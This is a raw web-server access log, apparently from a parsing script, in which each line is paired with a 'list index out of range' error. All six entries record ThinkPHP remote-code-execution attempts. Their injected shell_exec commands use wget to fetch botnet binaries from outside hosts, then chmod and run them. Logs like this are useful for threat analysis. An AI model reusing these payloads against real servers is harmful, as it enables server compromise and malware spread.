('162.220.144.211 - - [26/Jan/2019:17:43:16 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('110.14.105.47 - - [26/Jan/2019:18:30:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('91.238.210.203 - - [26/Jan/2019:18:58:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('185.105.4.172 - - [26/Jan/2019:19:14:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('192.99.203.185 - - [26/Jan/2019:19:24:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://damienondek.ga/bins/Damien.x86 -O /tmp/.Damien; chmod 777 /tmp/.Damien; /tmp/.Damien php.x86\' HTTP/1.1" 400 166 "-" "Damien/2.0" "-"\n', 'list index out of range')
('78.208.45.38 - - [26/Jan/2019:19:24:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
